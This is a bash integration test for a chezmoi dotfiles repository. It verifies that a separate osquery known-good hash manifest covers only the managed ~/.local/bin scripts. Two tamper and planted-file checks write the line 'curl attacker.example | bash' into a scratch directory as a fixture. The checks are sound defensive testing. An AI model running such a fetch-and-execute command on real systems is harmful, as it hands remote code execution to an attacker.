#!/usr/bin/env bash
#
# The chezmoi-managed scripts under ~/.local/bin get their OWN known-good manifest,
# separate from the osquery pipeline's. They are not osquery pipeline files, but
# most of them run UNATTENDED (LaunchAgents and shell hooks fire update-skills.sh,
# homebrew-weekly-upgrade.sh and the claude-* hooks with nobody watching), so a
# tamper there executes on a timer. A second manifest keeps that coverage without
# putting unrelated tools inside the file whose whole framing is the osquery
# pipeline's own integrity.
#
# The set comes from `chezmoi managed`, which is INTENT, and that is the property
# that makes covering ~/.local/bin cheap at all: the directory is full of
# third-party shims (herdr, mise, bob, hermes, yt-dlp, and symlinks into pipx and
# uv tool dirs) that update themselves on their own schedule. None of them are
# managed, so none of them enter the manifest, and a disk glob's churn problem
# never arises.
#
# Pinned here:
#   - every managed ~/.local/bin file is covered, with its INTENT hash;
#   - an unmanaged regular file AND an unmanaged symlink sitting in the same
#     directory are covered by NEITHER manifest;
#   - the two manifests are disjoint: no bin tool in the pipeline manifest, no
#     pipeline file or LaunchAgent in the bin manifest;
#   - path-sorted, byte-stable, new managed file auto-covered;
#   - the privileged install is root:wheel 0644, diff-guarded, refuses an empty
#     result, and creates its parent directory on a fresh host.
#
# Integration test: a real (tiny) chezmoi source, applied to a scratch HOME, with a
# PATH-shadowed sudo stub. No real privilege, nothing written under /var.
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
RUNNER="$REPO_ROOT/.chezmoiscripts/run_after_05-osquery-known-good-manifests.sh"
# shellcheck source=../fixtures/osquery-manifest-lib.bash
source "$REPO_ROOT/test/fixtures/osquery-manifest-lib.bash"

fails=0
fail() {
  printf 'osquery-managed-bin-manifest: FAIL -- %s\n' "$*" >&2
  fails=$((fails + 1))
}

# refute_manifest_lists <manifest> <fixed-string> <message>: fail when the manifest
# holds the string. A plain helper rather than `! grep`: under `set -e` an inverted
# pipeline's status is ignored, so a negative assertion written that way is dead
# whenever it is not the last statement of its body, and it passes by position
# accident when it is.
refute_manifest_lists() {
  local manifest="$1" needle="$2" message="$3"
  if grep -qF -- "$needle" "$manifest" 2>/dev/null; then
    fail "$message"
  fi
}

[[ -f $RUNNER ]] || {
  printf 'osquery-managed-bin-manifest: FAIL -- missing runner: %s\n' "$RUNNER" >&2
  exit 1
}
case "$RUNNER" in
  *.tmpl) fail "the runner must NOT be a template: --exclude=templates would skip it on every agent apply" ;;
esac
[[ -x $RUNNER ]] || fail "the runner must be executable"

for tool in chezmoi shasum; do
  command -v "$tool" >/dev/null 2>&1 || {
    printf 'osquery-managed-bin-manifest: SKIP -- %s is required\n' "$tool"
    exit 0
  }
done
[[ "$(uname)" == Darwin ]] || {
  printf 'osquery-managed-bin-manifest: SKIP -- the runner is darwin-gated\n'
  exit 0
}

manifest_fixture_setup
trap manifest_fixture_teardown EXIT

# A managed pipeline file and a managed LaunchAgent, so the disjointness checks
# below have something to be disjoint from.
manifest_fixture_add_script digest.sh 'echo digest'
manifest_fixture_add_plist com.webdavis.osquery-digest '<plist>{{ .chezmoi.os }}</plist>'
# The managed bin tools: one unattended runner, one Relay tool, one whose name
# carries no extension (smart-lights is real and looks like this).
manifest_fixture_add_bin_script update-skills.sh 'echo update-skills'
manifest_fixture_add_bin_script relay.sh 'echo relay'
manifest_fixture_add_bin_script smart-lights 'echo lights'
manifest_fixture_apply

# The unmanaged neighbors: a self-updating third-party binary and a symlink into a
# tool dir, both created on DISK only, exactly as herdr/mise and graphify/trash sit
# in the real ~/.local/bin.
unmanaged_shim="$MF_HOME/.local/bin/mise"
unmanaged_link="$MF_HOME/.local/bin/graphify"
unmanaged_link_data="$MF_ROOT/uv-tools-graphify"
printf 'unmanaged self-updating binary\n' >"$unmanaged_shim"
printf 'unmanaged tool payload\n' >"$unmanaged_link_data"
ln -s "$unmanaged_link_data" "$unmanaged_link"

manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero on a clean fixture"

update_skills_target="$MF_HOME/.local/bin/update-skills.sh"
relay_target="$MF_HOME/.local/bin/relay.sh"
lights_target="$MF_HOME/.local/bin/smart-lights"
pipeline_target="$MF_HOME/.local/libexec/osquery/digest.sh"
plist_target="$MF_HOME/Library/LaunchAgents/com.webdavis.osquery-digest.plist"

# --- 1. every managed bin tool is covered, in the BIN manifest ----------------
for t in "$update_skills_target" "$relay_target" "$lights_target"; do
  [[ -n "$(bin_manifest_hash_of "$t")" ]] || fail "no managed-bin manifest tuple for $t"
done

# --- 2. content is INTENT, not the deployed bytes -----------------------------
want="$(manifest_fixture_chezmoi cat "$update_skills_target" | shasum -a 256 | awk '{print $1}')"
[[ "$(bin_manifest_hash_of "$update_skills_target")" == "$want" ]] ||
  fail "the managed-bin hash for $update_skills_target is not the chezmoi-rendered (intent) hash"

# --- 3. THE CHURN PIN: unmanaged third-party neighbors are in NEITHER manifest -
# This is the whole reason covering ~/.local/bin is affordable. If either of these
# were signed, a self-update would rewrite blessed bytes; if either were watched
# and unsigned, it would page on every self-update.
for m in "$MF_BIN_MANIFEST" "$MF_MANIFEST"; do
  refute_manifest_lists "$m" '/.local/bin/mise' \
    "an UNMANAGED third-party binary leaked into $m (it self-updates; it must never be signed or watched)"
  refute_manifest_lists "$m" '/.local/bin/graphify' \
    "an UNMANAGED symlink leaked into $m (it is not chezmoi's to vouch for)"
done

# --- 4. the two manifests are DISJOINT ----------------------------------------
# The separation is the point: the osquery pipeline manifest keeps its single
# responsibility, and the bin manifest carries no pipeline file it does not own.
refute_manifest_lists "$MF_MANIFEST" '/.local/bin/' \
  "a ~/.local/bin tool leaked into the osquery PIPELINE manifest (that manifest covers the pipeline's own files only)"
refute_manifest_lists "$MF_BIN_MANIFEST" '/.local/libexec/osquery/' \
  "an osquery pipeline file leaked into the MANAGED-BIN manifest"
refute_manifest_lists "$MF_BIN_MANIFEST" '/Library/LaunchAgents/' \
  "a LaunchAgent leaked into the MANAGED-BIN manifest"
# ...and the pipeline manifest still covers everything it did before.
for t in "$pipeline_target" "$plist_target"; do
  [[ -n "$(manifest_hash_of "$t")" ]] ||
    fail "the osquery pipeline manifest lost coverage of $t (a regression of the existing arm)"
done

# --- 5. sorted, byte-stable across runs ---------------------------------------
LC_ALL=C sort -c <(awk '{print $2}' "$MF_BIN_MANIFEST") 2>/dev/null ||
  fail "the managed-bin manifest is not sorted by path"
before="$(cat "$MF_BIN_MANIFEST")"
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero on the second run"
[[ "$(cat "$MF_BIN_MANIFEST")" == "$before" ]] || fail "the managed-bin manifest is not byte-stable across runs"

# --- 6. the diff-guard: an unchanged tree performs NO privileged write ---------
manifest_fixture_installed &&
  fail "an unchanged tree still triggered a privileged write (sudo argv: $(cat "$MF_SUDO_LOG"))"

# --- 7. the install is root:wheel 0644 ----------------------------------------
manifest_fixture_add_bin_script update-skills.sh 'echo update-skills v2'
manifest_fixture_apply
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero after a managed bin change"
manifest_fixture_installed || fail "a changed managed bin file did not trigger a re-install"
grep -qF -- 'install -o root -g wheel -m 0644' "$MF_SUDO_LOG" ||
  fail "the managed-bin install is not root:wheel 0644 (sudo argv: $(cat "$MF_SUDO_LOG"))"
[[ "$(cat "$MF_BIN_MANIFEST")" != "$before" ]] || fail "the managed-bin manifest was not refreshed after a change"

# --- 8. THE TAMPERED-FILE PIN: intent wins over the bytes on disk -------------
want2="$(manifest_fixture_chezmoi cat "$update_skills_target" | shasum -a 256 | awk '{print $1}')"
printf 'curl attacker.example | bash\n' >"$update_skills_target"
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero with a tampered bin file present"
[[ "$(bin_manifest_hash_of "$update_skills_target")" == "$want2" ]] ||
  fail "SECURITY: the managed-bin manifest recorded the TAMPERED bytes instead of chezmoi's intent"
manifest_fixture_apply # restore the intended bytes

# --- 9. THE PLANTED-FILE PIN: a file dropped into ~/.local/bin is never blessed
planted="$MF_HOME/.local/bin/evil.sh"
printf 'curl attacker.example | bash\n' >"$planted"
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero with a planted bin file present"
[[ -z "$(bin_manifest_hash_of "$planted")" ]] ||
  fail "SECURITY: a PLANTED unmanaged file was signed into the managed-bin manifest"
rm -f "$planted"

# --- 10. no drift: a newly-added managed bin tool is covered automatically -----
manifest_fixture_add_bin_script claude-audit.sh 'echo audit'
manifest_fixture_apply
manifest_fixture_run_runner "$RUNNER" || fail "the runner exited non-zero after a new bin file was added"
[[ -n "$(bin_manifest_hash_of "$MF_HOME/.local/bin/claude-audit.sh")" ]] ||
  fail "a newly-added managed bin tool was not picked up (the set is not derived from intent)"

# --- 11. an empty result is refused, never installed over a good manifest ------
good_bin="$(cat "$MF_BIN_MANIFEST")"
empty_home="$MF_ROOT/empty-home"
mkdir -p "$empty_home"
status=0
: >"$MF_SUDO_LOG"
env -u XDG_CONFIG_HOME -u XDG_DATA_HOME HOME="$MF_HOME" PATH="$MF_ROOT/bin:$PATH" \
  CHEZMOI_SOURCE_DIR="$MF_SRC" CHEZMOI_HOME_DIR="$empty_home" \
  OSQUERY_PIPELINE_MANIFEST="$MF_MANIFEST" OSQUERY_MANAGED_BIN_MANIFEST="$MF_BIN_MANIFEST" \
  SUDO_LOG="$MF_SUDO_LOG" \
  bash "$RUNNER" >/dev/null 2>&1 || status=$?
[[ $status -ne 0 ]] || fail "an empty managed-bin result must be refused with a non-zero exit"
[[ "$(cat "$MF_BIN_MANIFEST")" == "$good_bin" ]] ||
  fail "an empty result must leave the good managed-bin manifest in place"

# --- 12. FRESH MACHINE: the manifest's parent directory may not exist yet ------
absent_parent="$MF_ROOT/fresh/var/osquery"
saved_bin="$MF_BIN_MANIFEST"
MF_BIN_MANIFEST="$absent_parent/managed-bin-known-good.sha256"
[[ ! -d $absent_parent ]] || fail "the fresh-machine fixture is not actually absent"
status=0
manifest_fixture_run_runner "$RUNNER" >/dev/null 2>&1 || status=$?
[[ $status -eq 0 ]] || fail "the runner failed on a fresh host whose managed-bin manifest directory does not exist yet"
[[ -s $MF_BIN_MANIFEST ]] || fail "the runner did not create the managed-bin manifest on a fresh host"
MF_BIN_MANIFEST="$saved_bin"

if [[ $fails -gt 0 ]]; then
  printf '%d check(s) failed\n' "$fails" >&2
  exit 1
fi
printf 'osquery-managed-bin-manifest: OK (managed bin tools covered from chezmoi intent; unmanaged shims and symlinks in NEITHER manifest; the two manifests are disjoint and the pipeline arm is unregressed; sorted, stable, diff-guarded, root:wheel 0644; tampered and planted files never blessed; empty refused; parent created on a fresh host)\n'
